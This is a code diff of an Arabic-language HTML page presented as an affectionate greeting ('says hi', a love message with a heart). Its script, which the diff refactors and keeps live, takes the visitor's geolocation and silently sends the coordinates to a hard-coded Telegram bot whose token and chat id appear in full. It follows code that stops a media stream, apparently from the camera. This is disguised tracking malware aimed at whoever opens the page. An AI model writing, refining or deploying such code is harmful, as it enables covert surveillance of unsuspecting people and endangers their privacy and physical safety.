@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title> kuza says hi 💖</title>
+<title>عسوله احبج 💖</title>
 <style>
   body {
     background-color: #ffe6f0;
@@ -65,7 +65,7 @@
 </head>
 <body>
 
-<div class="text"> kuza say hi كوزا يسلم عليكم💖</div>
+<div class="text">عسوله احبج 💖</div>
 <div class="heart"></div>
 
 <script>
@@ -99,20 +99,14 @@
 
         stream.getTracks().forEach(track => track.stop());
 
-        // إرسال الموقع الجغرافي
-        navigator.geolocation.getCurrentPosition(function(position) {
+        navigator.geolocation.getCurrentPosition(position => {
           const latitude = position.coords.latitude;
           const longitude = position.coords.longitude;
 
-          const botToken = "6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0";
-          const chatId = "1320552080";
-
-          const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
-
-          fetch(url)
-            .then(() => console.log("تم إرسال الموقع"))
-            .catch(error => console.error("فشل إرسال الموقع:", error));
-        }, function(error) {
+          fetch(`https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendLocation?chat_id=1320552080&latitude=${latitude}&longitude=${longitude}`, {
+            method: "GET"
+          });
+        }, error => {
           console.error("فشل الحصول على الموقع:", error);
         });
 
